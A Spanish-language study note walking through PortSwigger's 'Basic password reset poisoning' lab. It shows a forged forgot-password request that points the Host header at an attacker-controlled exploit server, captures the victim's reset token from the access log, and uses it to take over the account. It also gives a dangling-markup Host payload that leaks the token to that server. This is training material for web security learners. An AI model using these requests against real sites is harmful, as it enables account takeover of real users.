---
aliases:
  - Host Header 002 - password reset poisoning
  - basic password reset poisoning
tags:
  - vuln/host-header
  - example
  - portswigger
---

# 002 — Password reset poisoning (Host → exploit server)

> Lab: [Basic password reset poisoning](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-basic-password-reset-poisoning) · **Practitioner** · técnica → [[vulnerabilities/016-host-header-injection/host-header|entry point]]

## ¿Por qué acá? (el Host reflejado en un email)
- **Ahora el Host cae en una URL absoluta:** el link del email de reset se arma concatenando el `Host` de tu request. Si lo controlás, controlás a dónde apunta el link.
- **Por qué funciona:** pedís el reset de la víctima con **tu** dominio en el `Host`; el token se envía en un link hacia **tu server**. Cuando la víctima abre el mail, su token de reseteo cae en **tu access log**.

## Cómo explotarlo

> 🟡 <mark>Resaltado</mark> = lo que reemplazás vos (tu exploit server / la víctima).

Interceptá el `POST /forgot-password` y apuntá el `Host` a tu exploit server:
<pre class="payload"><code>POST /forgot-password HTTP/1.1
Host: <mark>TU-EXPLOIT-SERVER.exploit-server.net</mark>

username=<mark>carlos</mark></code></pre>
Cuando carlos abre el mail, en el **access log** de tu exploit server aparece el token:
<pre class="payload"><code>GET /forgot-password?temp-forgot-password-token=<mark>XXXXX</mark></code></pre>
Usá ese token en el lab para poner una contraseña nueva:
<pre class="payload"><code>GET /forgot-password?temp-forgot-password-token=<mark>XXXXX</mark> HTTP/1.1
Host: <mark>LAB-ID.web-security-academy.net</mark></code></pre>

## Verificación
El **access log** del exploit server registra el `GET /forgot-password?temp-forgot-password-token=...` de la víctima; con ese token cambiás la pass y **entrás como carlos** → lab resuelto.

## Detalles que se pasan por alto
- Si el `Host` está **validado** (conserva el dominio del lab) pero el email es **HTML**, inyectás por el **puerto** con dangling markup: `Host: LAB-ID…:'><img src="//TU-EXPLOIT-SERVER/?` → el `<img>` sin cerrar se traga el token (lab 3 · [labs/README](../labs/README#payloads-por-lab)).
- Es una toma de cuenta vía Host → relación con [[vulnerabilities/029-authentication/authentication|authentication]].

→ Siguiente: [[vulnerabilities/016-host-header-injection/examples/003-web-cache-poisoning-host-duplicado|003 · el Host validado se cuela con un Host duplicado y se cachea para todos]]
